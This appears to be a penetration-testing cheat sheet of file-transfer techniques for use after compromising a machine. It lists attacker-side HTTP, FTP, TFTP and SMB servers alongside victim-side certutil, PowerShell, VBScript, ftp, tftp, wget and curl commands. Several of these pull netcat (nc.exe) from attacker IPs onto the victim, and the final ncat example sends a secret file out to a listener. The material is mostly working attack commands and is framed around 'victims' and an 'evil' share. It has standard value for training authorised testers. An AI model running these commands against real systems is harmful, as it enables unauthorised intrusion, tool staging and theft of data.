HTTP
You can setup an HTTP server on your attacker machine to pass webshells and exploits to victims:
Python  -m SimpleHTTPServer 8008
Another way:
Python3  -m http.server 8008
These two ways setup a simple HTTP server that uses the directory in which you run the command the root directory of the server
Another way to setup an HTTP server is with Apache:
Service apache2 start
This one usually has a path of /var/www/html/ in which to put the files you want to transfer

Certutil:
This is supposed to be for certificate and CA management, but it’s abused by hackers as a method of file transfer on Windows. First we run our simple http server on linux at 10.0.2.15:8008/chuck.txt and send it to an output file called sentfile.txt on the Windows machine
Certutil -urlcache -split -f “http://10.0.2.15:8008/chuck.txt” sentfile.txt

Powershell:
Open up powershell and type:
Invoke-WebRequest -uri “https://github.com/GitbookIO/gitbook.git”  -outfile text.txt
VBScript:
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
Copy and pasting the code above will use the echo command to create a file on the victim with the name wget.vbs. This VBScript file can then be leveraged to download files over HTTP with the following command:
cscript /nologo wget.vbs http://10.10.14.17/nc.exe nc.exe

FTP:
FTP is usually installed on Windows clients, so we would setup an FTP server on our linux attacking machine using Pyftdlib:
Apt install python-pyftpdlib
We then setup an FTP server with this command:
Python -m pyftpdlib -p 21 -w
The only issue with this is FTP runs interactively where it prompts you for commands. To get around this we can create a file like this:
echo open ip-addr > ftp.txt
echo username >> ftp.txt
echo password >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
So we create a connection to the attacking machines FTP server, and in this case we are just using anonymous for credentials, then we switch to binary mode and GET a particular file and exit out. Now this set of commands will just create the file on the victim machine, to execute it run:
ftp -v -n -s:ftp.txt

TFTP:
We can use aftpd on our Linux machine to setup a TFTP server:
Atftpd  --daemon  --port 69  /root/tftp
You have to create a world writeable/readable directory, in this case we have it at /root/tftp
Then on your windows machine you run:
Tftp  -i 192.168.56.100 GET chuck.txt

SMB:
SMB is pretty common amongst Windows environments and we have a python based SMB server on our Linux at /usr/share/doc/python-impacket/examples/smbserver.py. To set it up:
Python /usr/share/doc/python-impacket/examples/smbserver.py  myevilshare /usr/share/windows-binaries/
 To view the available shares on the SMB server we use:
Net view \\ip-address
To view the files on this share we do:
Dir \\ip-address\share-name
Share name in this case is myevilshare.
To download a file use the copy command:
Copy \\192.168.56.100\myevilshare\nc.exe netcat.exe
We see the ip address followed by the share name (myevilshare) the file that is at the smb server location, and the name of the outfile we want on our machine. 
WGET:
Wget https://ip-address/files/nc.exe -o netcat.exe
CURL:
Curl https://ip-address/files/nc.exe -o netcat.exe

Secure Copy:
We can use ncat for this on Linux. Lets say we have computer A at 192.168.56.100 and computer B at 192.168.56.101. on computer A we setup a secure listener:
Ncat -nlvp 1234  --ssl > myoutputfile.txt
Then on computer B we connect to computer A and signify the file we want sent to computer A:
Ncat -nv 192.168.56.100 1234  --ssl  <  supersecretfile.txt

